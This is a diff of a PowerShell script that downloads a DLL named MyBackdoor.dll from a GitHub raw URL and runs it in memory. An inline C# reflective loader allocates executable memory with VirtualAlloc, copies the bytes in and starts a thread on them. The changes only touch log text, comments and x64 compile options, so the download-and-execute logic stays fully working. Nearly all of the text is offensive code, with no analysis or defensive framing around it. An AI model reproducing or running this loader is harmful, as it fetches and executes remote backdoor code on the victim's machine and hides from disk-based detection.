@@ -7,10 +7,10 @@ if ([Environment]::Is64BitProcess) {
 
 # 1) Download the DLL bytes
 $payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
-Write-Host "[+] Downloading payload from $payloadUrl"
+Write-Host "[*] Downloading payload from $payloadUrl"
 $dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)
 
-# 2) Define the real reflective loader
+# 2) Define the real reflective loader, compiled for x64
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -31,7 +31,6 @@ public static class ReflectiveLoader {
         IntPtr hHandle, uint dwMilliseconds);
 
     public static void LoadAndRun(byte[] rawAssembly) {
-        // MEM_COMMIT | MEM_RESERVE = 0x1000 | 0x2000, PAGE_EXECUTE_READWRITE = 0x40
         IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawAssembly.Length, 0x3000, 0x40);
         Marshal.Copy(rawAssembly, 0, addr, rawAssembly.Length);
         uint threadId;
@@ -39,8 +38,8 @@ public static class ReflectiveLoader {
         WaitForSingleObject(hThread, 0xFFFFFFFF);
     }
 }
-"@
+"@ -Language CSharp -CompilerOptions "/platform:x64"
 
-# 3) Load and execute the payload
-Write-Host "[+] Reflectively loading payload.dll into memory"
+# 3) Invoke it
+Write-Host "[*] Reflectively loading payload.dll into memory"
 [ReflectiveLoader]::LoadAndRun($dllBytes)
